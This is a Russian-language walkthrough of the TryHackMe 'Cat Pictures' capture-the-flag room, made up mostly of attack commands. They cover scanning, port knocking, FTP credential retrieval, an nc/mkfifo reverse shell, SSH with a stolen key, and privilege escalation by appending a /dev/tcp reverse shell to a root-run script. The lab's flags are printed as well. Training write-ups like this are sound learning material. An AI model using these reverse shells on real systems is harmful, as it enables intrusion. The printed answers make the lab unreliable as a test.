

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Cat Pictures](https://tryhackme.com/r/room/catpictures) 

Всего 2 задания:
## Задание 1
Нажмите зеленую кнопку развертывания и атакуйте MACHINE_IP!

ПРИМЕЧАНИЕ: запуск и настройка занимают некоторое время... некоторые службы запускаются и открывают порты медленно, 
поэтому наберитесь терпения. 

### Ответьте на вопросы ниже
Разверните меня!
```commandline
Ответ не нужен
```

## Задание 2
Отдайте мне все флаги!!!
### Ответьте на вопросы ниже
Флаг 1
```commandline
nmap -sC -sV -p- <IP>
gobuster dir -u http://<IP>:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
for i in 1111 2222 3333 4444;do nmap -Pn -p $i --host-timeout 201 --max-retries 0 <IP>; done
ftp <IP>
ls
get note.txt
cat note.txt
password:sardinethecat
nc <IP> 4420
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my-own-ip> <4444> >/tmp/f
nc -lvp 4444
ls
./runme
password: rebecca
cd /home/catlover/
ls -la
chmod 600 cat_rsa
ssh -i cat_rsa catlover@<IP>
id
ls -la
cat /root/flag.txt
```
```commandline
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
```
Корневой флаг
```commandline
cat /opt/claen/clean.sh
echo 'bash -i >& /dev/tcp/<my_own_IP>/4422 0>&1' >> clean.sh
nc -lvp 4422
```
```commandline
4a98e43d78bab283938a06f38d2ca3a3c53f0476
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)